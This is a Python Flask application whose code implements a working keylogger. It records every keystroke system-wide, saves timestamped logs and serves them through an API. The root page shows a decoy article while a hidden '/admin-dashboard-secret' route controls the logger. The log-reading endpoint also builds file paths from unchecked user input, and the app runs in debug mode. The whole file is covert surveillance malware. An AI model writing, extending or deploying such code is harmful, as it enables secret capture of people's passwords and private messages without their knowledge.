from flask import Flask, render_template, jsonify, request
from flask_cors import CORS
import keyboard
import time
from datetime import datetime
import os
from threading import Timer, Thread
import json

app = Flask(__name__)
CORS(app)

class Keylogger:
    def __init__(self, interval=60, log_file="keylog.txt"):
        self.interval = interval
        self.log_file = log_file
        self.log = ""
        self.start_time = None
        self.end_time = None
        self.is_running = False
        self.timer = None
        self.listener_thread = None
        self.current_session_logs = []
        
    def callback(self, event):
        """This callback is invoked whenever a keyboard event occurs"""
        if not self.is_running:
            return
            
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == "tab":
                name = "[TAB]"
            elif name == "backspace":
                name = "[BACKSPACE]"
            else:
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        """Update the filename with current timestamp"""
        start_dt_str = self.start_time.strftime("%Y-%m-%d_%H-%M-%S")
        end_dt_str = self.end_time.strftime("%Y-%m-%d_%H-%M-%S")
        return f"keylog_{start_dt_str}_{end_dt_str}.txt"
    
    def report(self):
        """Create a log file with the current timestamp"""
        if self.log and self.is_running:
            self.end_time = datetime.now()
            filename = self.update_filename()
            
            if not os.path.exists("logs"):
                os.mkdir("logs")
            
            log_path = os.path.join("logs", filename)
            with open(log_path, "w") as f:
                f.write(f"Keylog Report\n")
                f.write(f"Start Time: {self.start_time}\n")
                f.write(f"End Time: {self.end_time}\n")
                f.write("-" * 50 + "\n\n")
                f.write(self.log)
            
            # Add to session logs
            self.current_session_logs.append({
                "filename": filename,
                "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S"),
                "end_time": self.end_time.strftime("%Y-%m-%d %H:%M:%S"),
                "char_count": len(self.log)
            })
            
            print(f"[+] Saved keylog to {log_path}")
            self.log = ""
            self.start_time = datetime.now()
        
        if self.is_running:
            self.timer = Timer(interval=self.interval, function=self.report)
            self.timer.daemon = True
            self.timer.start()
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return {"status": "error", "message": "Keylogger is already running"}
        
        self.is_running = True
        self.start_time = datetime.now()
        self.current_session_logs = []
        
        print(f"[*] Keylogger started at {self.start_time}")
        
        # Start the timer
        self.report()
        
        # Start the keyboard listener in a separate thread
        keyboard.on_release(callback=self.callback)
        
        return {"status": "success", "message": "Keylogger started", "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S")}
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return {"status": "error", "message": "Keylogger is not running"}
        
        self.is_running = False
        
        # Stop the timer
        if self.timer:
            self.timer.cancel()
        
        # Unhook the keyboard listener
        keyboard.unhook_all()
        
        # Final report
        if self.log:
            self.report()
        
        print("[*] Keylogger stopped")
        return {"status": "success", "message": "Keylogger stopped"}
    
    def get_status(self):
        """Get current status of the keylogger"""
        return {
            "is_running": self.is_running,
            "start_time": self.start_time.strftime("%Y-%m-%d %H:%M:%S") if self.start_time else None,
            "current_buffer": len(self.log),
            "interval": self.interval,
            "session_logs": self.current_session_logs
        }

# Global keylogger instance
keylogger = Keylogger(interval=60)

@app.route('/')
def index():
    """Main page - shows the decoy article/blog"""
    return render_template('decoy.html')

@app.route('/admin-dashboard-secret')
def admin():
    """Hidden admin dashboard for keylogger control"""
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_logging():
    data = request.json
    interval = data.get('interval', 60)
    keylogger.interval = interval
    result = keylogger.start()
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
def stop_logging():
    result = keylogger.stop()
    return jsonify(result)

@app.route('/api/status', methods=['GET'])
def get_status():
    status = keylogger.get_status()
    return jsonify(status)

@app.route('/api/logs', methods=['GET'])
def get_logs():
    logs_dir = "logs"
    if not os.path.exists(logs_dir):
        return jsonify([])
    
    log_files = []
    for filename in os.listdir(logs_dir):
        if filename.endswith('.txt'):
            filepath = os.path.join(logs_dir, filename)
            stat = os.stat(filepath)
            log_files.append({
                "filename": filename,
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
            })
    
    # Sort by modified time, newest first
    log_files.sort(key=lambda x: x['modified'], reverse=True)
    return jsonify(log_files)

@app.route('/api/logs/<filename>', methods=['GET'])
def get_log_content(filename):
    filepath = os.path.join("logs", filename)
    if not os.path.exists(filepath):
        return jsonify({"status": "error", "message": "File not found"}), 404
    
    with open(filepath, 'r') as f:
        content = f.read()
    
    return jsonify({"status": "success", "content": content})

if __name__ == '__main__':
    app.run(debug=True, port=5000)
